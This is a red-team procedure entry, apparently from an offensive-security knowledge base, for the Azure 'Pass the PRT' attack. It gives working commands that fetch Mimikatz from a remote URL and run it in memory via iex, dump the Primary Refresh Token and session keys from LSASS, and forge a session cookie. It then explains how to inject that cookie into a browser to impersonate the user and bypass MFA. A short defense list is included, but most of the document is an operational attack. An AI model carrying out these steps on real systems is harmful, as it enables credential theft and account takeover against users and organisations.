---
id: 62e04165-3022-4f6d-af61-e18953cbd62d
name: Azure-Pass-The-PRT-with-Mimikatz
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.707900+00:00'
updated_at: '2023-05-25T19:01:32.208860+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Pass the Ticket|T1097 - Pass the Ticket]]'
sub_techniques: []
platforms:
  - Cloud
  - Windows
tags:
  - '[[tags/Cloud - Azure]]'
  - '[[tags/Mimikatz]]'
  - '[[tags/Mimikatz - Credential Manager & DPAPI]]'
  - '[[tags/Pass The PRT]]'
  - '[[tags/Windows - DPAPI]]'
commands:
  - '[[commands/dsregcmd-display-azuread-status]]'
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Azure-Pass-The-PRT-with-Mimikatz

## Summary

This procedure demonstrates how to extract a Primary Refresh Token (PRT) from an Azure Active Directory (AAD)-joined Windows machine using Mimikatz, decrypt necessary keys, and generate a session cookie to impersonate the user in a browser, bypassing MFA for accessing Azure resources.

## Description

Pass the PRT is a post-exploitation technique targeting Azure AD credentials stored in the LSASS process on domain-joined Windows machines. By dumping and decrypting the PRT along with associated keys (KeyValue, Context, ClearKey, DerivedKey), an attacker can forge a valid session cookie for the Microsoft login portal. This allows persistent access to Azure services without re-authentication. The technique relies on local administrative access to the target machine and is effective against AAD-joined devices where PRTs are used for single sign-on. Success enables lateral movement and data access in cloud environments, but detection can occur via anomalous logins or Mimikatz execution traces.

## Requirements

1. Local administrative access to an Azure AD-joined Windows machine with a valid PRT.
2. Mimikatz tool (version 2.2.0 or later) installed or downloadable on the target.
3. PowerShell execution policy allowing script downloads and execution.
4. Target machine must show AzureAdPrt: YES and AzureAdJoined: YES via status check.

## Defense

- Enable multi-factor authentication (MFA) for all Azure AD accounts and monitor for bypass attempts.
- Implement device compliance policies in Azure AD to restrict access from unmanaged devices.
- Monitor Windows event logs for LSASS dumps, Mimikatz signatures, and anomalous PowerShell executions.
- Use Endpoint Detection and Response (EDR) tools to block credential dumping tools like Mimikatz.
- Regularly rotate credentials and enforce least-privilege access in Azure resources.

## Objectives

1. Verify the presence of a PRT on the target machine.
2. Extract the PRT, session keys, and derived components from LSASS using Mimikatz.
3. Decrypt keys and generate a valid PRT session cookie.
4. Inject the cookie into a browser to authenticate as the target user and access Azure portals.

## Instructions

### Step 1: Verify Azure AD Join and PRT Status

**Context**: Confirm the machine is Azure AD-joined and has an active PRT, as this is required for extraction. Without AzureAdPrt: YES, the procedure cannot proceed.

**Command** ([[commands/dsregcmd-display-azuread-status]]):
```bash
dsregcmd.exe /status
```

> This command queries the device's registration status. Look for AzureAdJoined: YES and AzureAdPrt: YES in the output to validate prerequisites.

### Step 2: Extract PRT and Keys Using Mimikatz

**Context**: Use Mimikatz to dump the PRT from LSASS, decrypt the session key with the ProofOfPossessionKey, and generate the final session cookie using the derived key and context. This step requires elevating to SYSTEM privileges and copying specific values (PRT, KeyValue, Context, DerivedKey) for subsequent commands.

**Code** ([[codes/Invoke-Mimikatz-for-Azure-PRT-Extraction]]):
```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug


# Display the PRT data and copy the PRT key and the ProofOfPosessionKey.KeyValue
Mimikatz> sekurlsa::cloudap

# Decrypt the session key (use the ProofOfPossesionKey keyvalue here); Copy the Context value and Derived key value
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Use the PRT Key, Context and Derived key copied earlier; Copy the Signature with key token "ey...", this is the PRT session cookie
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
```

> Download and invoke Mimikatz via PowerShell. Enable debug privileges, dump cloud AP data to retrieve PRT and KeyValue. Elevate token, decrypt with KeyValue to get Context and DerivedKey, then forge the cookie using all components. The final output is a JWT-like token starting with "ey..." valid for 14 days.

### Step 3: Inject PRT Session Cookie into Browser

**Context**: Manually add the extracted session cookie to a browser's storage to hijack the user's Azure AD session, allowing access to login.microsoftonline.com without credentials or MFA.

**Instructions**: Open a private/incognito window in Firefox or Chrome, navigate to https://login.microsoftonline.com, and open Developer Tools (Ctrl+Shift+I). Go to the Storage/Application tab, select Cookies under https://login.microsoftonline.com, and add a new cookie with Name: x-ms-RefreshTokenCredential, Value: [paste the ey... token from Step 2], and set HttpOnly to True. Refresh the page to authenticate as the target user.

> This manual insertion simulates the PRT for SSO. Verify by accessing Azure portals; successful login indicates the cookie is active.
